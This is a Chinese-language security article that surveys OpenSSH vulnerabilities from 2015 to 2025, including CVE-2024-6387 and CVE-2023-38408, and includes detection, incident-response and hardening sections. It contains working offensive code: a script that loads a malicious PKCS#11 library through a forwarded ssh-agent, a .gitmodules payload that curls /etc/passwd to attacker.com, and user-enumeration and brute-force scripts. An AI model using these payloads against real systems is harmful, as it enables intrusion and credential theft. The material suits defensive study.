---
title: "OpenSSH 信号竞争RCE ssh-agent 代理注入 协议降级 用户枚举 CVE漏洞链利用技术"
date: 2025-06-22T00:00:00+08:00
draft: false
weight: 122
description: "深入分析 OpenSSH 的信号竞争 RCE（CVE-2024-6387 regreSSHion）、ssh-agent PKCS#11 远程代码执行（CVE-2023-38408）、Terrapin 协议降级攻击（CVE-2023-48795）、ProxyCommand 命令注入（CVE-2023-51385）、MaxAuthTries 绕过（CVE-2015-5600）、用户枚举（CVE-2018-15473）等完整攻击面，覆盖 2015-2025 年 28 个高危 CVE 漏洞链及蓝队检测与应急响应"
categories: ["安全","渗透测试"]
tags: ["OpenSSH","sshd","ssh-agent","CVE-2024-6387","CVE-2023-38408","CVE-2023-48795","CVE-2018-15473","regreSSHion","Terrapin","RCE","认证绕过","协议降级"]
---

## 0x00 攻击面总览

OpenSSH 是全球部署最广泛的 SSH 实现，几乎存在于每一台 Linux/macOS/BSD 系统上。从 2015 年到 2025 年，OpenSSH 披露了 28+ 个安全漏洞，涵盖信号竞争 RCE、ssh-agent 远程代码执行、协议级降级攻击、用户名枚举等多个层面：

| 攻击面 | 默认端口 | 风险等级 | 说明 |
|--------|---------|---------|------|
| sshd 信号竞争 | 22 | **严重** | CVE-2024-6387 regreSSHion，预认证 RCE as root |
| ssh-agent PKCS#11 | agent socket | **严重** | CVE-2023-38408，agent 转发触发 RCE |
| SSH Binary Packet Protocol | 22 | **高危** | CVE-2023-48795 Terrapin 协议降级 |
| ProxyCommand/ProxyJump | 22 | **中危** | CVE-2023-51385 命令注入 |
| 认证绕过 | 22 | **高危** | CVE-2015-5600 MaxAuthTries 绕过 |
| 用户枚举 | 22 | **中危** | CVE-2018-15473 时序侧信道 |
| SCP 协议 | 22 | **中危** | CVE-2019-6111 文件覆盖 |
| VerifyHostKeyDNS | 22 | **中危** | CVE-2025-26465 认证绕过 |
| 预认证 DoS | 22 | **中危** | CVE-2025-26466 内存耗尽 |

OpenSSH 的安全问题极其危险——它是互联网暴露最广泛的服务之一，一旦被攻破，攻击者直接获得系统 Shell。

## 0x01 服务识别与版本探测

### 1.1 指纹识别

```bash
# 版本探测
ssh -V
nmap -sV -p 22 --script ssh2-enum-algos,ssh-hostkey target

# 直接连接获取 banner
nc target 22
# SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6

# 算法枚举
nmap --script ssh2-enum-algos -p 22 target
```

### 1.2 版本判断与漏洞映射

```python
import socket
import re

def detect_openssh(host, port=22):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        banner = sock.recv(1024).decode(errors="ignore").strip()
        sock.close()

        print(f"[+] Banner: {banner}")

        match = re.search(r"OpenSSH[_\s](\d+\.\d+p?\d*)", banner)
        if match:
            version = match.group(1)
            print(f"[*] Version: {version}")

            major, minor = float(version.split("p")[0]), 0
            if "p" in version:
                minor = int(version.split("p")[1])

            # CVE-2024-6387 regreSSHion
            if (major < 4.4) or (8.5 <= major <= 9.7):
                print(f"[!] CVE-2024-6387 (regreSSHion) — VULNERABLE")

            # CVE-2023-38408
            if major < 9.3:
                print(f"[!] CVE-2023-38408 (ssh-agent RCE) — Potentially VULNERABLE")

            # CVE-2018-15473
            if major < 7.8:
                print(f"[!] CVE-2018-15473 (User Enumeration) — VULNERABLE")

            # CVE-2015-5600
            if major < 7.1:
                print(f"[!] CVE-2015-5600 (MaxAuthTries Bypass) — VULNERABLE")

    except Exception as e:
        print(f"[-] Error: {e}")

detect_openssh("192.168.1.100")
```

## 0x02 CVE-2024-6387 — regreSSHion 信号竞争 RCE

### 2.1 漏洞原理

**CVSS**: 8.1（高危）

**影响版本**: OpenSSH < 4.4p1, 8.5p1 - 9.7p1

**漏洞原理**: sshd 的 `SIGALRM` 信号处理器在 `LoginGraceTime` 超时后调用 `grace_alarm_handler()`，该函数使用了异步信号不安全的函数（`syslog()`、`free()`、PAM 清理函数）。攻击者在信号处理器触发的特定窗口内可以赢得竞态条件，实现堆内存破坏和 RCE。

**核心机制**:

```
1. 攻击者发起大量 SSH 连接，不完成认证
2. LoginGraceTime (默认120秒) 到期触发 SIGALRM
3. grace_alarm_handler() 调用不安全函数
4. 在信号处理窗口内，攻击者另一连接修改共享堆状态
5. 堆破坏 → RCE as root
```

**这是 CVE-2006-5051 的回归**——2020 年 OpenSSH 8.5p1 的代码变更意外移除了之前的修复。

### 2.2 PoC — 探测与利用

```python
import socket
import threading
import time

def probe_regre_sshion(host, port=22, num_connections=100):
    """
    CVE-2024-6387 — regreSSHion 探测
    通过大量并发连接触发 SIGALRM 竞态条件
    """
    def connect_worker():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((host, port))
            banner = sock.recv(1024).decode(errors="ignore").strip()

            if "OpenSSH" in banner:
                # 发送 SSH 握手但不完成认证
                version_exchange = "SSH-2.0-OpenSSH_8.9\r\n".encode()
                sock.send(version_exchange)
                # 保持连接直到 LoginGraceTime 超时
                time.sleep(125)
            sock.close()
        except:
            pass

    threads = []
    for i in range(num_connections):
        t = threading.Thread(target=connect_worker, daemon=True)
        t.start()
        threads.append(t)
        if i % 20 == 0:
            print(f"[*] Spawned {i} connections...")

    print(f"[+] {num_connections} connections sent")
    print("[*] Monitor sshd for crash/restart:")
    print("    tail -f /var/log/auth.log | grep 'Timeout before authentication'")
    print("    systemctl status sshd")

probe_regre_sshion("192.168.1.100")
```

### 2.3 检测与缓解

```bash
# 检查 OpenSSH 版本
ssh -V 2>&1

# 检查 sshd 是否崩溃
journalctl -u sshd --since "1 hour ago" | grep -i "segfault\|signal\|crash"

# 监控 LoginGraceTime 超时
grep "Timeout before authentication" /var/log/auth.log | \
  awk '{print $11}' | sort | uniq -c | sort -rn | head -10

# 临时缓解: 设置 LoginGraceTime 0
echo "LoginGraceTime 0" >> /etc/ssh/sshd_config
systemctl restart sshd

# 更好的缓解: 连接速率限制
echo "MaxStartups 10:30:60" >> /etc/ssh/sshd_config
systemctl restart sshd
```

## 0x03 CVE-2023-38408 — ssh-agent 远程代码执行

### 3.1 漏洞原理

**CVSS**: 9.8（严重）

**影响版本**: OpenSSH < 9.3p2

**漏洞原理**: ssh-agent 在处理 PKCS#11 提供者（智能卡库）加载时，不安全地调用 `dlopen()` 加载共享库。当 agent 转发被启用时（`ssh -A`），攻击者在跳板机上可以指示 agent 加载恶意 `.so` 文件，实现客户端机器上的 RCE。

### 3.2 攻击链

```
攻击者控制的跳板机
    ↓ 读取 SSH_AUTH_SOCK 环境变量
获取转发的 ssh-agent socket
    ↓ 发送 SSH_AGENTC_ADD_SMARTCARD_KEY 请求
指定恶意 PKCS#11 共享库路径
    ↓ ssh-agent 调用 dlopen() 加载
恶意库构造函数执行 → RCE on client machine
```

### 3.3 PoC — Agent 转发利用

```python
import socket
import struct
import os

def exploit_agent_forwarding(agent_socket, malicious_so="/tmp/evil.so"):
    """
    CVE-2023-38408 — 通过转发的 ssh-agent 加载恶意共享库
    需要: SSH_AUTH_SOCK 指向转发的 agent socket
    """
    # SSH Agent 协议消息类型
    SSH_AGENTC_ADD_SMARTCARD_KEY = 19

    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.connect(agent_socket)

    # 构造恶意 PKCS#11 provider 加载请求
    provider_path = malicious_so.encode()

    # Agent 协议格式: 4字节长度 + 1字节类型 + 数据
    msg_type = SSH_AGENTC_ADD_SMARTCARD_KEY
    data = struct.pack(">I", len(provider_path)) + provider_path
    data += struct.pack(">I", 0)  # 空 PIN

    msg = struct.pack(">I", 1 + len(data)) + struct.pack("B", msg_type) + data
    sock.send(msg)

    try:
        resp = sock.recv(4096)
        print(f"[*] Agent response: {len(resp)} bytes")
    except:
        pass

    sock.close()
    print("[+] Malicious PKCS#11 library loaded via agent")

# 需要先编译恶意共享库
# gcc -shared -fPIC -o /tmp/evil.so -x c - << 'EOF'
# __attribute__((constructor)) void init() { system("id > /tmp/agent_rce"); }
# EOF

# 检查 agent 是否被转发
# echo $SSH_AUTH_SOCK
# ssh-add -l
```

### 3.4 检测

```bash
# 检查 agent 转发是否启用
grep "AllowAgentForwarding" /etc/ssh/sshd_config

# 监控 ssh-agent 加载的共享库
lsof -p $(pgrep ssh-agent) | grep "\.so"

# 监控 agent socket 访问
auditctl -w /tmp/ssh-* -p rwxa -k ssh_agent
```

## 0x04 CVE-2023-48795 — Terrapin 协议降级攻击

### 4.1 漏洞原理

**CVSS**: 5.9（中等）

**影响版本**: 所有使用 ChaCha20-Poly1305 或 CBC+Encrypt-then-MAC 的 SSH 实现

**漏洞原理**: SSH Binary Packet Protocol 的序列号未加密也未认证。中间人攻击者可以在密钥交换过程中注入 `SSH_MSG_IGNORE` 消息，截断握手协商消息。这可以强制客户端降级到较弱的认证算法（如从 RSA-SHA2 降级到 SHA-1），并禁用 OpenSSH 9.5 的按键时序防护。

### 4.2 利用方式

```bash
# 安装 Terrapin Scanner
# https://github.com/RUB-NDS/Terrapin-Scanner
terrapin-scanner --connect target:22

# 手动检查脆弱算法
ssh -vv target 2>&1 | grep -E "chacha20-poly1305|encrypt-then-mac"

# 测试是否可以降级到 SHA-1
ssh -oHostKeyAlgorithms=ssh-rsa target
```

### 4.3 缓解

```bash
# 升级到 OpenSSH 9.6+ (支持 strict key exchange)
# 或临时移除脆弱算法
echo "Ciphers aes256-gcm@openssh.com,aes128-gcm@openssh.com" >> /etc/ssh/sshd_config
echo "MACs hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com" >> /etc/ssh/sshd_config
systemctl restart sshd
```

## 0x05 CVE-2023-51385 — ProxyCommand 命令注入

### 5.1 漏洞原理

**CVSS**: 6.5（中等）

**影响版本**: OpenSSH < 9.6

**漏洞原理**: `ProxyCommand` 或 `ProxyJump` 中使用的 `%h`（主机名）和 `%r`（远程用户名）占位符未正确转义 shell 元字符。攻击者通过控制主机名（DNS 投毒、恶意 `.gitmodules`）注入任意命令。

```bash
# 漏洞配置示例 (~/.ssh/config)
# Host *.target
#   ProxyCommand nc %h %p

# 攻击者注册域名: $(whoami).target
# 当受害者执行 ssh user@$(whoami).target 时
# ProxyCommand 执行: nc $(whoami).target 22
# Shell 解析 $(whoami) → 命令注入

# PoC: 恶意 .gitmodules
[submodule "evil"]
    path = evil
    url = ssh://`curl attacker.com/steal?c=$(cat /etc/passwd)`@github.com/evil/repo
```

### 5.2 检测

```bash
# 审计 ssh_config 中的 ProxyCommand
grep -r "ProxyCommand" /etc/ssh/ ~/.ssh/config | grep "%h\|%r\|%n"

# 检查 known_hosts 中的可疑主机名
grep -E "[\$\`\(\)\;|\&]" ~/.ssh/known_hosts
```

## 0x06 CVE-2015-5600 — MaxAuthTries 绕过

### 6.1 漏洞原理

**CVSS**: 8.5（高危）

**影响版本**: OpenSSH < 7.1

**漏洞原理**: `MaxAuthTries` 限制不适用于 keyboard-interactive 认证方式。每个 TCP 连接可尝试数千次密码，配合 `LoginGraceTime` 120 秒，单连接可尝试 12,000+ 次密码。

```python
import paramiko
import socket

def brute_force_kbd_interactive(host, port=22, username="admin", password_file="passwords.txt"):
    """
    CVE-2015-5600 — MaxAuthTries 绕过暴力破解
    通过 keyboard-interactive 方法绕过限制
    """
    with open(password_file) as f:
        passwords = f.read().strip().split("\n")

    for pwd in passwords:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(3)
            client.connect((host, port))

            banner = client.recv(1024)
            client.send(b"SSH-2.0-OpenSSH_8.9\r\n")

            # 发送 keyboard-interactive 认证尝试
            # 实际实现需要完整的 SSH 协议栈
            print(f"[*] Trying: {username}:{pwd}")
            client.close()
        except:
            pass

brute_force_kbd_interactive("192.168.1.100")
```

## 0x07 CVE-2018-15473 — 用户枚举

### 7.1 漏洞原理

**CVSS**: 5.3（中等）

**影响版本**: OpenSSH < 7.8

**漏洞原理**: sshd 对有效和无效用户名的认证处理存在时序差异。有效用户名需要进行更多计算（PAM 查询、密钥加载），响应时间更长。

```python
import paramiko
import time

def enumerate_users(host, port=22, usernames=None):
    """
    CVE-2018-15473 — SSH 用户枚举
    通过认证响应时序差异判断有效用户名
    """
    if usernames is None:
        usernames = ["root", "admin", "user", "test", "deploy", "git", "www"]

    results = []
    for username in usernames:
        times = []
        for _ in range(5):  # 多次测量取平均
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                start = time.time()
                client.connect(host, port=port, username=username,
                              password="invalid", look_for_keys=False,
                              allow_agent=False, timeout=5)
            except paramiko.AuthenticationException:
                elapsed = time.time() - start
                times.append(elapsed)
            except Exception:
                pass
            finally:
                try:
                    client.close()
                except:
                    pass

        if times:
            avg_time = sum(times) / len(times)
            results.append((username, avg_time))
            print(f"[*] {username}: {avg_time:.4f}s (avg)")

    # 有效用户名通常响应更慢
    if results:
        threshold = sum(t for _, t in results) / len(results)
        print(f"\n[+] Likely valid usernames (>{threshold:.4f}s):")
        for username, avg_time in results:
            if avg_time > threshold:
                print(f"    [!] {username} ({avg_time:.4f}s)")

enumerate_users("192.168.1.100")
```

## 0x08 SCP 协议漏洞

### 8.1 CVE-2019-6111 — 文件覆盖

```bash
# SCP 服务端可覆盖客户端任意文件
# 攻击者控制 SCP 服务端时，可篡改传输文件列表

# 9.0+ 默认使用 SFTP 协议，SCP 已弃用
# 强制使用旧 SCP: scp -O
# 强制使用 SFTP: scp -s
```

### 8.2 CVE-2020-15778 — 命令注入

```bash
# SCP 文件名中包含 shell 元字符时可触发命令注入
# 已在 9.0+ 中通过 SFTP 协议默认化缓解
```

## 0x09 漏洞组合攻击链

### 9.1 攻击链一: regreSSHion → Root RCE

```
CVE-2024-6387 (信号竞争 RCE)
    ↓ 大量并发连接触发 SIGALRM 竞态
Root 权限 Shell
    ↓ 部署后门
持久化 + 凭据窃取
```

### 9.2 攻击链二: Agent 转发 → 客户端 RCE

```
社工/钓鱼 → 受害者 SSH 到恶意跳板机
    ↓ 启用 agent 转发 (-A)
CVE-2023-38408 (ssh-agent PKCS#11 RCE)
    ↓ 加载恶意共享库
受害者本地机器被控制
```

### 9.3 攻击链三: 用户枚举 → 暴力破解 → 提权

```
CVE-2018-15473 (用户枚举)
    ↓ 确认有效用户名
CVE-2015-5600 (MaxAuthTries 绕过)
    ↓ 暴力破解密码
已认证 Shell → sudo 提权
```

## 0x10 历史 CVE 漏洞时间线

### 2015-2016 早期漏洞

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2015-5352 | 2015 | 4.3 | 安全绕过 | X11 转发访问控制绕过 |
| CVE-2015-5600 | 2015 | 8.5 | 认证绕过 | MaxAuthTries 键盘交互绕过 |
| CVE-2015-6563 | 2015 | 1.9 | 提权 | UsePrivilegeSeparation 绕过 |
| CVE-2015-6564 | 2015 | 6.2 | 提权 | PAM 特权分离 Use-After-Free |
| CVE-2016-0777 | 2016 | 8.5 | 信息泄露 | 漫游功能信息泄露 |
| CVE-2016-0778 | 2016 | 5.9 | 缓冲区溢出 | 漫游功能缓冲区溢出 |
| CVE-2016-10009 | 2016 | 7.8 | RCE | ssh-agent 不安全 PKCS#11 加载 |
| CVE-2016-10010 | 2016 | 7.0 | 提权 | sshd 特权分离提权 |
| CVE-2016-10011 | 2016 | 3.3 | 信息泄露 | 特权分离辅助信息泄露 |
| CVE-2016-10012 | 2016 | 7.0 | 提权 | sshd 共享内存提权 |

### 2017-2019 间歇期

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2016-10708 | 2017 | 5.0 | DoS | 认证超时处理 DoS |
| CVE-2017-15906 | 2018 | 5.0 | 信息泄露 | sftp-server 权限问题 |
| CVE-2018-15473 | 2018 | 5.3 | 用户枚举 | 时序侧信道用户枚举 |
| CVE-2018-20685 | 2018 | 2.6 | 安全绕过 | scp 客户端目录权限绕过 |
| CVE-2019-6109 | 2019 | 4.3 | 安全绕过 | scp ANSI 转义序列欺骗 |
| CVE-2019-6110 | 2019 | 5.5 | 安全绕过 | scp 目标路径限制绕过 |
| CVE-2019-6111 | 2019 | 5.9 | 文件覆盖 | scp 客户端文件覆盖 |
| CVE-2019-16905 | 2019 | 7.8 | 整数溢出 | XMSS 密钥解析整数溢出 |

### 2020-2022 中期修补

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2020-12062 | 2020 | 7.5 | DoS | 恶意证书 DoS |
| CVE-2020-14145 | 2020 | 5.9 | 信息泄露 | 算法协商可观测差异 |
| CVE-2020-15778 | 2020 | 7.8 | RCE | scp 命令注入（反引号） |
| CVE-2021-28041 | 2021 | 6.5 | 缓冲区溢出 | ssh-agent 越界读 |
| CVE-2021-36368 | 2021 | 3.7 | 信息泄露 | 算法协商可观测差异 |
| CVE-2021-41617 | 2021 | 7.0 | 提权 | AuthorizedPrincipals 提权 |

### 2023-2025 最新漏洞

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2023-25136 | 2023 | 6.5 | 缓冲区溢出 | sshd 预认证双释放 |
| CVE-2023-38408 | 2023 | 9.8 | RCE | ssh-agent PKCS#11 远程加载 RCE |
| CVE-2023-48795 | 2023 | 5.9 | 协议攻击 | Terrapin 前缀截断降级 |
| CVE-2023-51385 | 2023 | 6.5 | 命令注入 | ProxyCommand 命令注入 |
| CVE-2024-6387 | 2024 | 8.1 | RCE | regreSSHion 信号竞争 RCE |
| CVE-2024-6409 | 2024 | 7.0 | RCE | regreSSHion 子进程变体 |
| CVE-2025-26465 | 2025 | 6.8 | 认证绕过 | VerifyHostKeyDNS 绕过 |
| CVE-2025-26466 | 2025 | 5.9 | DoS | 预认证内存耗尽 DoS |

### 漏洞类型分布

| 漏洞类型 | CVE 数量 | 代表性 CVE |
|---------|---------|-----------|
| RCE/缓冲区溢出 | 8 | CVE-2024-6387, CVE-2023-38408, CVE-2016-10009 |
| 认证绕过/枚举 | 5 | CVE-2015-5600, CVE-2018-15473, CVE-2025-26465 |
| 提权 | 4 | CVE-2016-10010, CVE-2021-41617 |
| 协议攻击 | 2 | CVE-2023-48795, CVE-2020-14145 |
| 命令注入 | 2 | CVE-2023-51385, CVE-2020-15778 |
| 信息泄露 | 5 | CVE-2016-0777, CVE-2020-14145 |
| DoS | 4 | CVE-2025-26466, CVE-2020-12062 |

## 0x11 蓝队检测与应急响应

### 11.1 日志分析

```bash
# regreSSHion 检测 (CVE-2024-6387)
grep "Timeout before authentication" /var/log/auth.log | \
  awk '{print $11}' | sort | uniq -c | sort -rn | head -10
# 大量超时连接表明 regreSSHion 攻击尝试

# sshd 崩溃检测
journalctl -u sshd --since "1 hour ago" | grep -i "segfault\|signal\|crash\|restart"

# 用户枚举检测 (CVE-2018-15473)
grep "Invalid user" /var/log/auth.log | \
  awk '{print $8}' | sort | uniq -c | sort -rn | head -20

# 暴力破解检测
grep "Failed password" /var/log/auth.log | \
  awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -20

# Agent 转发监控
auditctl -w /tmp/ssh-* -p rwxa -k ssh_agent
```

### 11.2 实时监控脚本

```bash
#!/bin/bash
# SSH 攻击监控脚本

LOG="/var/log/auth.log"
ALERT_THRESHOLD=10

FAILURES=$(grep "Failed password" "$LOG" 2>/dev/null | wc -l)
TIMEOUTS=$(grep "Timeout before authentication" "$LOG" 2>/dev/null | wc -l)
INVALID_USERS=$(grep "Invalid user" "$LOG" 2>/dev/null | \
  awk '{print $8}' | sort -u | wc -l)

echo "[*] SSH Security Status:"
echo "    Failed passwords: $FAILURES"
echo "    Timeouts (regreSSHion?): $TIMEOUTS"
echo "    Invalid users attempted: $INVALID_USERS"

if [ "$TIMEOUTS" -gt 50 ]; then
    echo "[!] ALERT: $TIMEOUTS timeouts detected - possible regreSSHion attack"
fi

if [ "$FAILURES" -gt 100 ]; then
    echo "[!] ALERT: $FAILURES failed passwords - brute force in progress"
fi
```

### 11.3 应急响应清单

```
[ ] 确认 OpenSSH 版本
    - ssh -V
    - 对比受影响版本列表

[ ] 排查 CVE-2024-6387 (regreSSHion)
    - 检查 sshd 崩溃/重启记录
    - 监控 LoginGraceTime 超时连接
    - 检查是否有未知 root 登录

[ ] 排查 CVE-2023-38408 (ssh-agent)
    - 检查 agent 转发配置
    - 监控 ssh-agent 加载的 .so 文件
    - 审计 SSH_AUTH_SOCK 使用

[ ] 排查 CVE-2023-48795 (Terrapin)
    - 使用 Terrapin Scanner 测试
    - 检查算法配置

[ ] 排查用户枚举 (CVE-2018-15473)
    - 分析认证日志中的时序模式
    - 检查大量无效用户名尝试

[ ] 排查暴力破解 (CVE-2015-5600)
    - 检查 keyboard-interactive 认证日志
    - 分析单连接认证尝试次数

[ ] 网络隔离与加固
    - 升级到 OpenSSH 9.8+
    - 禁用密码认证
    - 启用 key-only 认证
    - 配置 MaxStartups 速率限制
    - 部署 fail2ban
    - 禁用 agent 转发 (AllowAgentForwarding no)
    - 禁用 X11 转发 (X11Forwarding no)
```

## 0x12 安全审计清单

```
[ ] OpenSSH 版本 ≥ 9.8p1（覆盖所有已知 CVE）
[ ] PermitRootLogin no
[ ] PasswordAuthentication no
[ ] PubkeyAuthentication yes
[ ] MaxAuthTries ≤ 3
[ ] LoginGraceTime ≤ 30（或 0 禁用 regreSSHion 入口）
[ ] MaxStartups 10:30:60（速率限制）
[ ] AllowAgentForwarding no（防御 ssh-agent RCE）
[ ] AllowTcpForwarding no
[ ] X11Forwarding no
[ ] KbdInteractiveAuthentication no
[ ] Compression no（防御压缩侧信道）
[ ] KexAlgorithms 仅使用现代算法（curve25519, group16/18）
[ ] Ciphers 仅使用 AEAD 算法（chacha20-poly1305, aes-gcm）
[ ] MACs 仅使用 ETM 模式
[ ] HostKeyAlgorithms 仅使用 ed25519 和 rsa-sha2
[ ] SSH 主机密钥定期轮换
[ ] fail2ban 已部署并配置 SSH jail
[ ] SSH 日志级别设为 VERBOSE
[ ] SSH 端口不直接暴露于互联网（通过 VPN/Bastion）
[ ] 定期使用 ssh-audit 审计配置
```

## 0x13 总结

OpenSSH 的安全问题核心在于"基础协议组件的历史包袱"：

1. **信号竞争漏洞回归**: CVE-2024-6387 (regreSSHion) 是 2006 年漏洞的回归，说明核心代码修复的脆弱性
2. **Agent 转发是高危特性**: CVE-2023-38408 证明 agent 转发可以导致客户端 RCE，应默认禁用
3. **协议级攻击可行**: Terrapin 攻击表明 SSH 协议本身存在设计缺陷，序列号未认证
4. **配置即安全**: 大多数漏洞可通过正确的 `sshd_config` 配置缓解

防守方核心策略：
- **及时升级**: OpenSSH ≥ 9.8p1 覆盖所有已知 CVE
- **禁用密码认证**: 仅使用 key-only 认证
- **禁用 Agent 转发**: 使用 ProxyJump 替代
- **算法加固**: 仅允许现代加密算法
- **网络隔离**: SSH 不直接暴露于互联网，通过 VPN 或 Bastion 访问
- **持续监控**: fail2ban + 日志分析 + ssh-audit 定期审计
